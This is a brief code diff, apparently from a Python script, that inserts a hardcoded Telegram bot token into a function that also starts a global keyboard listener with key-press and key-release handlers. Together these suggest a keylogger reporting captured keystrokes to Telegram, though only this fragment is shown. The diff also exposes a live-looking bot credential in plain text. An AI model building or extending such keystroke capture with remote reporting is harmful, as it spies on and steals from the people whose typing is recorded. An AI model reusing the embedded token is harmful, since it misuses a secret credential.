@@ -9,7 +9,7 @@ async def main():
     #logging.basicConfig(filename="errors.log", level=logging.ERROR, format="%(asctime)s - %(message)s")
     
     try:
-        bot = Bot(token="")
+        bot = Bot(token="7348242610:AAG4Jyl41n0DqCX5AYKskb3AXkJXB2IDJso")
         
         listener = kb.Listener(on_press=detect_k, on_release=release_k)
         listener.start()
